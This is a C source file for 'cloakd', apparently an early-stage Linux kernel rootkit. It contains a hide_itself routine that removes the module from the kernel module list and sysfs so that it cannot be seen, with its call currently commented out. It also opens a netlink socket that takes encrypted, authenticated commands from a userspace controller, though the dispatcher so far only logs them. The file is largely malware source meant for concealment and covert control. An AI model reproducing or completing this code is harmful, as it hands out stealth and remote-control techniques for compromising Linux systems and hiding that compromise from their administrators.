#include <linux/init.h>
#include <linux/module.h>
#include <linux/skbuff.h>
#include <linux/netlink.h>
#include <net/sock.h>

#include "crypto.h"
#include "commands.h"


struct cloakd_params 
{
    bool hidden;
    struct list_head *mod_before_me;
    struct list_head *mod_kobj_before_me;
    struct sock *nl_sock;
};

static struct cloakd_params params = { 
    .hidden = false,
    .nl_sock = NULL,
};
 
static void nl_recv_cmd(struct sk_buff*);

struct netlink_kernel_cfg nl_kern_cfg = {
    .groups = 1,            /* <------ Do I really need this? */
    .input = nl_recv_cmd,
};

static void hide_itself(void)
{
    if (params.hidden)
        return;

    params.mod_before_me = THIS_MODULE->list.prev;
    params.mod_kobj_before_me = THIS_MODULE->mkobj.kobj.entry.prev;

    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);

    params.hidden = true;
    printk(KERN_INFO "cloakd is hidden\n");
}
/*
static void reveal_itself(void)
{
    if (!params.hidden)
        return;

    list_add(&THIS_MODULE->list, params.mod_before_me);
    kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "cloakd");
    params.hidden = false;
}
*/

static void process_payload(const u8 *payload)
{
    u8 cmd;

    if (!payload)
        return;

    cmd = payload[0];

    switch (cmd)
    {
        //default:    return;
        default:    printk(KERN_INFO "cloakd: unknown command=0x%x\n", cmd); break;  
        case 0x01:  printk(KERN_INFO "cloakd: command=0x%x\n", cmd); break;  
    }
}

/******************************************************************************
 * Callback - when a netlink packet arrives 
 * the kernel will invoke this function
 *****************************************************************************/
static void nl_recv_cmd(struct sk_buff *sk_buf)
{
    int pid;
    const u8 *encrypted_payload, *decrypted_payload;
    struct nlmsghdr *msg_hdr;

    printk(KERN_INFO "cloakd: netlink command\n");
    msg_hdr = nlmsg_hdr(sk_buf);
    pid = msg_hdr->nlmsg_pid;
    encrypted_payload = nlmsg_data(msg_hdr);

    printk(KERN_INFO "cloakd: pid [%d] is calling us with encrypted payload:\n", pid);
    //printk(KERN_INFO "cloakd: encrypted payload=%ph\n", (const void *)encrypted_payload);
    print_hex_dump(KERN_INFO, "", DUMP_PREFIX_NONE, 16, 1, encrypted_payload, msg_hdr->nlmsg_len - NLMSG_HDRLEN, 1);

    decrypted_payload = authenticate_and_decrypt(encrypted_payload);
    printk(KERN_INFO "cloakd: decrypted payload:\n");
    print_hex_dump(KERN_INFO, "", DUMP_PREFIX_NONE, 16, 1, decrypted_payload, ksize(decrypted_payload), 1);
    process_payload(decrypted_payload);
    kfree(decrypted_payload);
}

static void netlink_init(void)
{
    params.nl_sock = netlink_kernel_create(&init_net, 31 /*NETLINK_GENERIC*/, &nl_kern_cfg);	
    if (!params.nl_sock)
        printk(KERN_ERR "Can't create netlink socket\n");
}

static int __init cloakd_init(void)
{
//    hide_itself();
    netlink_init();
    return 0;
}

static void __exit cloakd_exit(void)
{
    netlink_kernel_release(params.nl_sock);
}

/*****************************************************************************/
module_init(cloakd_init);
module_exit(cloakd_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("unixbeard");
/*****************************************************************************/
